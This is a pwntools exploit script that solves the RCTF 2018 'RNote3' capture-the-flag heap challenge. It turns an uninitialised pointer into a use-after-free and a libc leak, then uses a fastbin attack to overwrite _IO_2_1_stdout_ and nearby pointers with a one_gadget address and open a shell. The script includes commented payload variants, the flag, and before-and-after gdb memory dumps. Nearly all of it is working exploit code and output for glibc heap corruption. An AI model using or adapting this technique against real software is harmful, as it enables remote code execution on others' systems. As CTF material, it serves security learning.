#! /usr/bin/python

from pwn import *

# unininitialised current_note_ptr in delete funtion => UAF => leak
# fastbin attack

s = process('./RNote3')
#s = remote('rnote3.2018.teamrois.cn',7322)

def print_menu():
    for _ in range(6):
        print s.recvline()


def add_note(title, size, content):
    s.sendline('1')
    s.sendlineafter('title: ', title)
    s.sendlineafter('size: ', str(size))
    s.sendlineafter('content: ', content)
   

def view_note(title):
    s.sendline('2')
    s.sendlineafter('title: ', title)    
    s.recvline()
    return s.recvline()
    
def edit_note(title, content):
    s.sendline('3')
    s.sendlineafter('title: ', title)
    s.sendlineafter('content: ', content)
    

def delete_note(title):
    s.sendline('4')
    s.sendlineafter('title: ', title)
    
print_menu()

# ==== unininitialised ptr in delete funtion => UAF => leak 
add_note('AAAA', 0xf0, 'a' * 0x68)
add_note('BBBB', 0x70, 'b' * 0x70)
view_note('AAAA')
delete_note('x')
leak = view_note('\x00')[-7:-1:] + '\x00\x00'

leak = u64(leak)
#print 'leak =', hex(leak) # 0x7ffff7dd1b78
#libc : 0x7ffff7a0d000
#offset = 0x7ffff7dd1b78 - 0x7ffff7a0d000 = 0x3c4b78
libc_addr = leak - 0x3c4b78
log.info('libc_addr = ' + hex(libc_addr))
__malloc_hook_offset = 0x3c4b10
__malloc_hook_addr = libc_addr + __malloc_hook_offset
hook = __malloc_hook_addr - 0x23
one_gadget_offset = 0x4526a
one_gadget_addr = libc_addr + one_gadget_offset
log.info('__malloc_hook_addr = ' + hex(__malloc_hook_addr))
log.info('one_gadget_addr = ' + hex(one_gadget_addr))  # 0x7ffff7a5226a

realloc_offset = 0x846c0
realloc_addr = libc_addr + realloc_offset

_IO_2_1_stdin_addr = libc_addr + 0x3c48e0
_IO_2_1_stdout_addr = libc_addr + 0x3c5620
_IO_2_1_stderr_addr = libc_addr + 0x3c5540

log.info('_IO_2_1_stdin_addr = ' + hex(_IO_2_1_stdin_addr))
log.info('_IO_2_1_stdout_addr = ' + hex(_IO_2_1_stdout_addr))
log.info('_IO_2_1_stderr_addr = ' + hex(_IO_2_1_stderr_addr))

# this does not work since no scanf calls in source
#_wide_data_addr = _IO_2_1_stdin_addr + 157
#log.info('_wide_data_addr = ' + hex(_wide_data_addr))
#vtable_addr = _IO_2_1_stdin_addr + 208
#log.info('vtable_addr = ' + hex(vtable_addr))

# === fastbin attack
add_note('EEEE', 0x30, 'e' * 0x30)
add_note('CCCC', 0x60, 'c' * 0x60)
add_note('DDDD', 0x30, 'd' * 0x30)

view_note('CCCC')
delete_note('x')
#edit_note('\x00', p64(hook))
#edit_note('\x00', p64(_wide_data_addr))
edit_note('\x00',p64(_IO_2_1_stdout_addr + 157))

add_note('FFFF', 0x60, 'f' * 0x60)


#this does not work
#add_note('HHHH', 0x60, 'h' * 0x13 + p64(one_gadget_addr))

# no does not work because no scanf calls
#add_note('HHHH', 0x60, '\x00' * 0x13 + p64(0xffffffff) + p64(0) * 2 + p64(vtable_addr) + p64(one_gadget_addr)*6)

# this WORKS
# --->                                   memalign_hook        realloc_hook           malloc_hook
#add_note('HHHH', 0x60, 'h' * 0x3 + p64(one_gadget_addr) + p64(one_gadget_addr) + p64(realloc_addr)) 


# this WORKS - printf triggering it to happen
#  0x7ffff7a5cf91 <buffered_vfprintf+305>:	call   QWORD PTR [rax+0x38]  <- where rax+0x38 - one_gadget addr
payload = '\x00' * 0x2b + p64(_IO_2_1_stdout_addr + 192) 
payload += p64(_IO_2_1_stderr_addr) + p64(_IO_2_1_stdout_addr) + p64(_IO_2_1_stdin_addr)
payload += p64(one_gadget_addr) * 3


add_note('AA',0x68,payload)


# 0x55555555526d:call 0x555555554c9b <-add
# 0x55555555527f:call 0x555555554e32 <-view
# 0x555555555291:call 0x55555555502d <-edit
# 0x5555555552a3:call 0x555555554f2b <-delete
# 0x555555554fd0:cmp QWORD PTR [rbp-0x18],0x0 <- cmp current_note_ptr, 0 before 2 free calls in delete
# 0x555555554f4e:call 0x5555555549c8 <- printf(please input note title) in delete
# 0x555555554cd1:call 0x555555554a00 <-first malloc call in add_note function
gdb.attach(s, 
"""
b * 0x555555554f2b
b * 0x555555554f4e
b * 0x555555554cd1
""")


s.sendline('1')

s.interactive()
# RCTF{P1e4se_Be_C4refu1_W1th_Th3_P0inter_3c3d89}

'''
before:
gdb-peda$ x/64gx 0x7ffff7dd2620
0x7ffff7dd2620 <_IO_2_1_stdout_>:	0x00000000fbad2887	0x00007ffff7dd26a3
0x7ffff7dd2630 <_IO_2_1_stdout_+16>:	0x00007ffff7dd26a3	0x00007ffff7dd26a3
0x7ffff7dd2640 <_IO_2_1_stdout_+32>:	0x00007ffff7dd26a3	0x00007ffff7dd26a3
0x7ffff7dd2650 <_IO_2_1_stdout_+48>:	0x00007ffff7dd26a3	0x00007ffff7dd26a3
0x7ffff7dd2660 <_IO_2_1_stdout_+64>:	0x00007ffff7dd26a4	0x0000000000000000
0x7ffff7dd2670 <_IO_2_1_stdout_+80>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd2680 <_IO_2_1_stdout_+96>:	0x0000000000000000	0x00007ffff7dd18e0
0x7ffff7dd2690 <_IO_2_1_stdout_+112>:	0x0000000000000001	0xffffffffffffffff
0x7ffff7dd26a0 <_IO_2_1_stdout_+128>:	0x000000000a000000	0x00007ffff7dd3780
0x7ffff7dd26b0 <_IO_2_1_stdout_+144>:	0xffffffffffffffff	0x0000000000000000
0x7ffff7dd26c0 <_IO_2_1_stdout_+160>:	0x00007ffff7dd17a0	0x0000000000000000
0x7ffff7dd26d0 <_IO_2_1_stdout_+176>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd26e0 <_IO_2_1_stdout_+192>:	0x00000000ffffffff	0x0000000000000000
0x7ffff7dd26f0 <_IO_2_1_stdout_+208>:	0x0000000000000000	0x00007ffff7dd06e0 <-- from here
0x7ffff7dd2700 <stderr>:	0x00007ffff7dd2540	0x00007ffff7dd2620
0x7ffff7dd2710 <stdin>:	0x00007ffff7dd18e0	0x00007ffff7a2db70
0x7ffff7dd2720 <map>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd2730 <__printf_arginfo_table>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd2740 <buf>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd2750 <buffer>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd2760 <buffer>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd2770 <buffer>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd2780 <buffer>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd2790 <ttyname_buf>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd27a0 <getmntent_buffer>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd27b0 <qfcvt_bufptr>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd27c0 <buffer>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd27d0 <buffer>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd27e0 <buffer>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd27f0 <buffer>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd2800 <buffer>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd2810 <buffer>:	0x0000000000000000	0x0000000000000000

after:
gdb-peda$ x/64gx 0x7ffff7dd2620
0x7ffff7dd2620 <_IO_2_1_stdout_>:	0x00000000fbad2887	0x00007ffff7dd26a3
0x7ffff7dd2630 <_IO_2_1_stdout_+16>:	0x00007ffff7dd26a3	0x00007ffff7dd26a3
0x7ffff7dd2640 <_IO_2_1_stdout_+32>:	0x00007ffff7dd26a3	0x00007ffff7dd26a3
0x7ffff7dd2650 <_IO_2_1_stdout_+48>:	0x00007ffff7dd26a3	0x00007ffff7dd26a3
0x7ffff7dd2660 <_IO_2_1_stdout_+64>:	0x00007ffff7dd26a4	0x0000000000000000
0x7ffff7dd2670 <_IO_2_1_stdout_+80>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd2680 <_IO_2_1_stdout_+96>:	0x0000000000000000	0x00007ffff7dd18e0
0x7ffff7dd2690 <_IO_2_1_stdout_+112>:	0x0000000000000001	0xffffffffffffffff
0x7ffff7dd26a0 <_IO_2_1_stdout_+128>:	0x000000000a000000	0x00007ffff7dd3780
0x7ffff7dd26b0 <_IO_2_1_stdout_+144>:	0xffffffffffffffff	0x0000000000000000
0x7ffff7dd26c0 <_IO_2_1_stdout_+160>:	0x00007ffff7dd17a0	0x0000000000000000
0x7ffff7dd26d0 <_IO_2_1_stdout_+176>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd26e0 <_IO_2_1_stdout_+192>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd26f0 <_IO_2_1_stdout_+208>:	0x0000000000000000	0x00007ffff7dd26e0  <-- from here
0x7ffff7dd2700 <stderr>:	0x00007ffff7dd2540	0x00007ffff7dd2620
0x7ffff7dd2710 <stdin>:	0x00007ffff7dd18e0	0x00007ffff7a5226a
0x7ffff7dd2720 <map>:	0x00007ffff7a5226a	0x00007ffff7a5226a
0x7ffff7dd2730 <__printf_arginfo_table>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd2740 <buf>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd2750 <buffer>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd2760 <buffer>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd2770 <buffer>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd2780 <buffer>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd2790 <ttyname_buf>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd27a0 <getmntent_buffer>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd27b0 <qfcvt_bufptr>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd27c0 <buffer>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd27d0 <buffer>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd27e0 <buffer>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd27f0 <buffer>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd2800 <buffer>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd2810 <buffer>:	0x0000000000000000	0x0000000000000000

=======================================================================================
before:
gdb-peda$ x/32gx 0x7ffff7dd2710 + 0x8
0x7ffff7dd2718 <DW.ref.__gcc_personality_v0>:	0x00007ffff7a2db70	0x0000000000000000
0x7ffff7dd2728 <string_space>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd2738 <__printf_va_arg_table>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd2748 <transitions>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd2758 <buffer>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd2768 <buffer>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd2778 <buffer>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd2788 <buffer>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd2798 <getttyname_name>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd27a8 <fcvt_bufptr>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd27b8 <buffer>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd27c8 <buffer>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd27d8 <buffer>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd27e8 <buffer>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd27f8 <buffer>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd2808 <buffer>:	0x0000000000000000	0x0000000000000000

after:
gdb-peda$ x/32gx 0x7ffff7dd2710 + 0x8
0x7ffff7dd2718 <DW.ref.__gcc_personality_v0>:	0x00007ffff7a5226a	0x00007ffff7a5226a
0x7ffff7dd2728 <string_space>:	0x00007ffff7a5226a	0x0000000000000000
0x7ffff7dd2738 <__printf_va_arg_table>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd2748 <transitions>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd2758 <buffer>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd2768 <buffer>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd2778 <buffer>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd2788 <buffer>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd2798 <getttyname_name>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd27a8 <fcvt_bufptr>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd27b8 <buffer>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd27c8 <buffer>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd27d8 <buffer>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd27e8 <buffer>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd27f8 <buffer>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd2808 <buffer>:	0x0000000000000000	0x0000000000000000


'''



























